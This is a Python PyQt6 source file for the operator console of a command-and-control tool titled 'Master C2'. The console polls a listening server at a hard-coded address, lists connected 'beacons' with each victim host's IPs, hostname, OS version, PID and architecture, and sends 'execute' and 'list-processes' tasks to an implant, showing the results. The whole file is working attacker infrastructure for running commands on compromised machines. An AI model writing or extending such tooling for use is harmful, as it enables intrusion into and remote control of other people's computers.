#!/usr/bin/python3
from uuid import RFC_4122
from PyQt6 import QtCore, QtGui, QtWidgets
from colorama import (Fore as F, Back as B, Style as S)
from colors import TextColors
import sys, re
import requests
import json

BR, FT, FR, FG, FY, FB, FM, FC, ST, SD, SB = B.RED, F.RESET, F.RED, F.GREEN, F.YELLOW, F.BLUE, F.MAGENTA, F.CYAN, S.RESET_ALL, S.DIM, S.BRIGHT

# Configuration Settings
listening_mgr_addr = "http://192.168.1.5:5000"

def bullet(char, color):
    C = FB if color == 'B' else FR if color == 'R' else FG
    return SB + C + '[' + ST + SB + char + SB + C + ']' + ST + ' '

# Helper functions
def api_get_request(endpoint):
    response_raw = requests.get(listening_mgr_addr + endpoint).text
    response_json = json.loads(response_raw)
    return response_json

def api_post_request(endpoint, payload):
    response_raw = requests.post(listening_mgr_addr + endpoint, json=payload).text
    response_json = json.loads(response_raw)
    return response_json

info, err, ok = bullet('-', 'B'), bullet('!', 'R'), bullet('+', 'G')

class LazyDecoder(json.JSONDecoder):
    def decode(self, s, **kwargs):
        regex_replacements = [
            (re.compile(r'([^\\])\\([^\\])'), r'\1\\\\\2'),
            (re.compile(r',(\s*])'), r'\1'),
        ]
        for regex, replacement in regex_replacements:
            s = regex.sub(replacement, s)
        return super().decode(s, **kwargs)

class mainWidget(QtWidgets.QWidget):
    def __init__(self, parent):
        super().__init__(parent)
        self.setupUI()

    def setupUI(self):
        self.resize(980, 565)

        # Create the grid for the layout. We will put things in here to display
        self.gridLayout = QtWidgets.QGridLayout(self)
        self.gridLayout.setObjectName(u"gridLayout")
        self.gridLayout.setVerticalSpacing(4)
        self.gridLayout.setContentsMargins(0, 0, 0, 5)

        # Label for displaying text like status
        self.label = QtWidgets.QLabel(self)
        self.label.setObjectName(u"label")
        self.label.setStyleSheet("margin: 2px")
        # Add the Label to our Grid that we will display
        self.gridLayout.addWidget(self.label, 3, 0, 1, 1)

        # LineEdit to take in user input
        self.lineEdit = QtWidgets.QLineEdit(self)
        self.lineEdit.setStyleSheet("margin-right: 4px; padding: 5px;")
        # Add the LineEdit to our Grid
        self.gridLayout.addWidget(self.lineEdit, 3, 1, 1, 1)

        # get input from lineEdit and send it to parse and echo to Console
        self.lineEdit.returnPressed.connect(self.onLineEditEnter)

        # Column and row to show beacon stats
        self.tableWidget = QtWidgets.QTableWidget()
        self.tableWidget.setObjectName(u"tableWidget")
        self.tableWidget.verticalHeader().setVisible(False)
        self.tableWidget.setFixedHeight(150)
        self.tableWidget.setColumnCount(8)
        self.tableWidget.setHorizontalHeaderLabels(['Beacon ID','External IP','Internal IP','Hostname','OS Version','Process name','PID','Architecture'])
        self.tableWidget.horizontalHeader().setSectionResizeMode(QtWidgets.QHeaderView.ResizeMode.Stretch) # Fit to window :)
        # Table color, font and position on the grid
        self.tableWidget.setStyleSheet("background: #282a36; ")
        self.tableWidget.setFont(QtGui.QFont("Times New Roman", 12))
        # Position the table at the top of grid
        self.gridLayout.addWidget(self.tableWidget, 0, 0, 1, 3)

        # Big textbox to show output to the user
        # self.textEdit = QtWidgets.QTextEdit(self)
        self.textEdit = QtWidgets.QTextEdit(self)
        self.textEdit.setReadOnly(True)
        self.textEdit.setStyleSheet("background: #282a36; ")

        self.textEdit.setContextMenuPolicy(QtCore.Qt.ContextMenuPolicy.ActionsContextMenu)

        contextMenu = QtWidgets.QMenu(self)
        clear = contextMenu.addAction("Clear")
        # connect the clear action. if triggers executes a lambda function to clear the the textEdit Console
        clear.triggered.connect(lambda x: self.textEdit.clear())

        # adding clear action to Menu
        self.textEdit.addAction(clear)

        # Add the textbox to our Grid
        self.gridLayout.addWidget(self.textEdit, 1, 0, 1, 3)

        self.retranslateUi()
        QtCore.QMetaObject.connectSlotsByName(self)

    def retranslateUi(self):
        self.label.setText(QtCore.QCoreApplication.translate("Form", u">>>", None))
        

    def echoCommand(self):
        text = self.lineEdit.text()
        print(f"text :{text}")
        if text == '':
            return

        self.textEdit.append(f"{TextColors.Red('<br>Beacon>')} {text}")
    
    def parseCommand(self):
        command = self.lineEdit.text()
        command = command.split(" ")
        metaCommand = command.pop(0)  # remove the first word from the command array and save as the metacommand
        subCommand = ' '.join(map(str, command))  # Convert the command array back into a string. Returns the subcommand
        # self.textEdit.append("  {} {}".format("MetaCommand:",metaCommand))
        # self.textEdit.append("  {} {}".format("SubCommand: ",subCommand))
        if metaCommand == "help":
            self.helpMenu()
        if metaCommand == "cmd":
            self.execCommand(subCommand)
        if metaCommand == "ps":
            self.listProcesses()
        if metaCommand == "clear":
            self.textEdit.clear()

    def helpMenu(self):
        r1 = "{0:<8s} -   {1}".format("help", "This help menu.")
        r2 = "{0:<8s}-   {1}".format("cmd", "Execute a command.")
        r3 = "{0:<8s} -   {1}".format("ps", "List the running processes.")
        r4 = "{0:<8s} -   {1}".format("clear", "Clear output from display.")
        menu = "{}<br>{}<br>{}<br>{}".format(r1, r2, r3, r4)
        self.textEdit.append(TextColors.Green(menu))
    
    def clearCommandInput(self):
        self.lineEdit.setText("")

    def onLineEditEnter(self):
        print("[^] Called onLineEdit")
        self.echoCommand()
        self.parseCommand()
        self.clearCommandInput()

    def check_beacons(self):
        api_endpoint = "/reg"
        #print("\nHere's the tasks:\n")
        json_array = api_get_request(api_endpoint)
        if not json_array:
            return
        output = json_array[0]
        arch = output["Architecture"][::]
        hostname = output["Hostname"][::]
        ip_addr = output["IP"][::]
        pid = output["PID"][::]
        beacon_id = output["beacon_id"][::]
        proc_name = output["Process Name"][::]
        pub_ip = output["Public IP"][::]
        win_ver = output["Windows Version"][::]

        # Create row when beacon connects and add new row for each beacon connected
        self.currentRowCount = self.tableWidget.rowCount()
        self.tableWidget.insertRow(self.currentRowCount)

        self.tableWidget.setItem(self.currentRowCount, 0, QtWidgets.QTableWidgetItem(beacon_id))
        self.tableWidget.setItem(self.currentRowCount, 1, QtWidgets.QTableWidgetItem(pub_ip))
        self.tableWidget.setItem(self.currentRowCount, 2, QtWidgets.QTableWidgetItem(ip_addr))
        self.tableWidget.setItem(self.currentRowCount, 3, QtWidgets.QTableWidgetItem(hostname))
        self.tableWidget.setItem(self.currentRowCount, 4, QtWidgets.QTableWidgetItem(win_ver))
        self.tableWidget.setItem(self.currentRowCount, 5, QtWidgets.QTableWidgetItem(proc_name))
        self.tableWidget.setItem(self.currentRowCount, 6, QtWidgets.QTableWidgetItem(pid))
        self.tableWidget.setItem(self.currentRowCount, 7, QtWidgets.QTableWidgetItem(arch))

    def getOutput(self):
        api_endpoint = "/results"
        try:
            #print("sending request to get output")
            output_json = api_get_request(api_endpoint)
            if not output_json:
                return

            output_json1 = output_json[0]
            #print(output_json1)

            output_key = sorted(output_json1.keys())[0]
            #print(output_key)

            output_contents = output_json1[output_key]
            #print(output_contents)

            output = output_contents["contents"]

            # If theres a \n at the end delete it so we dont get an extra null line in the GUI
            if re.search(r'[\r\n]{1,2}$', output):
                output = re.sub(r'\n$', '', output)
                output = re.sub(r'\r$', '', output)

            # self.textEdit.setTextColor(QtGui.QColor('#FF2600'))  # Red
            self.textEdit.append(f"Results: \n{output}")
        except:
            return

    def execCommand(self, command):
        self.textEdit.append(f"Command has been sent to implant: cmd {command}\n")
        api_endpoint = "/tasks"
        #print("\nHere are the tasks that were added:\n")
        request_payload_string = f'[{{"task_type":"execute","command":"{command}"}}]'
        request_payload = json.loads(request_payload_string,cls=LazyDecoder)
        api_post_request(api_endpoint, request_payload)
        #pprint.pprint(api_post_request(api_endpoint, request_payload))
    
    def listProcesses(self):
        self.textEdit.append("Command has been executed\n")
        api_endpoint = "/tasks"
        request_payload_string = '[{"task_type":"list-processes"}]'
        request_payload = json.loads(request_payload_string)
        api_post_request(api_endpoint, request_payload)


class GuiMainWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()
        self.setStyleSheet("background: #44475a;color: #f0f8ff;")

    def initUI(self):
        self.resize(1024, 768)
        self.ChangeWindowTitle("Master C2")
        self.mainWidget = mainWidget(self)
        self.setCentralWidget(self.mainWidget)
        self.show()

    def ChangeWindowTitle(self, windowTitle):
        self.setWindowTitle(QtCore.QCoreApplication.translate("Form", windowTitle, None))

    def keyPressEvent(self, event):
        key = event.key()
        # If Esc key is pressed, then exit the program
        if key == QtCore.Qt.Key.Key_Escape.value:
            self.close()

if __name__ == '__main__':
    app = QtWidgets.QApplication(sys.argv)

    ex = GuiMainWindow()
    # Qt Signals (GUI to Server communications)
    # Poll the server for new messages from the agent
    timer = QtCore.QTimer()
    #timer.timeout.connect(lambda: ex.mainWidget.getOutput())
    timer.timeout.connect(lambda: ex.mainWidget.check_beacons())
    timer.timeout.connect(lambda: ex.mainWidget.getOutput())
    timer.start(5000)
    sys.exit(app.exec())
